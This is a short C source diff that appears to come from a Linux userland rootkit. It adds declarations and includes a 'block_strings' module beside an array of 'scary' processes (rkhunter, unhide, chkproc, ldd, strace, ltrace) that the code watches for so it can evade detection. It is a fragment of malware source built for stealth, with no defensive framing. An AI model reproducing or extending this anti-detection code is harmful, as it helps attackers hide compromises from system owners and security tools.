@@ -11,8 +11,12 @@ static char *scary_procs[8] = {"lsrootkit", "ldd", "unhide", "rkhunter",
                                "chkproc", "chkdirs", "ltrace", "strace"};
 
 #define SCARY_VARIABLES_SIZE sizeofarray(scary_variables)
-#define SCARY_PATHS_SIZE sizeofarray(scary_paths)
-#define SCARY_PROCS_SIZE sizeofarray(scary_procs)
+#define SCARY_PATHS_SIZE     sizeofarray(scary_paths)
+#define SCARY_PROCS_SIZE     sizeofarray(scary_procs)
+
+int scary_path(char *string);
+int block_strings(const char *filename, char *const argv[]);
+#include "block_strings.c"
 
 #define VINVALID_PERM 0
 #define VFORK_ERR    -1
